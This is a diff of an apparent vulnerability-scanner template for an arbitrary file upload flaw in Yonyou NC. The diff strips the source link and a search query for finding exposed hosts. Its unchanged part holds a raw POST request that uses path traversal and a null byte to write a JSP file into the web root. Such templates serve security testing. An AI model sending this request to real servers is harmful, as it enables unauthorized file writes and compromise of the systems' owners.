@@ -3,12 +3,8 @@ info:
   name: 用友NC doPost接口 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gladtnprg7hrkls3'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gladtnprg7hrkls3
-    fofa: title="YONYOU NC"
 http:
 - raw:
   - 'POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5Cdudesite.jsp%00 HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Content-Encoding: UTF_8
-
-
 
 
     dudesite
